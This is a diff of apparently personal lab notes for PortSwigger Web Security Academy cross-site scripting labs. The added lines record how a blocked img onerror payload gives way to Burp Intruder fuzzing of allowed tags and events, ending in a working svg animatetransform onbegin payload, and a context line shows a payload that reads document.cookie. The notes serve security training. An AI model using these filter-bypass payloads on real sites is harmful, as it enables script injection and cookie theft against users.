@@ -79,3 +79,22 @@ location = 'https://0ac800d20360cbfda1658ba600ba007b.web-security-academy.net/?s
 location = 'https://0ac800d20360cbfda1658ba600ba007b.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
 </script>
 
+===
+
+// standard payload gets blocked:
+<img src=1 onerror=alert(1)>
+
+// use burp intruder to test a list of any tags that are allowed (return 200)
+// we determine that svg is allowed, in addition to animatetransform.
+// we mold out our payload and then test any allowed events for the tag
+// using burp intruder again with the events list for brute force.
+<svg><animatetransform%20§§=1>
+
+// turns out onbegin event is allowed.
+// use that to finish creating the working payload.
+// apparently, onbegin triggers when an animated svg begins playing.
+<svg><animatetransform onbegin=alert(1)>
+
+
+
+
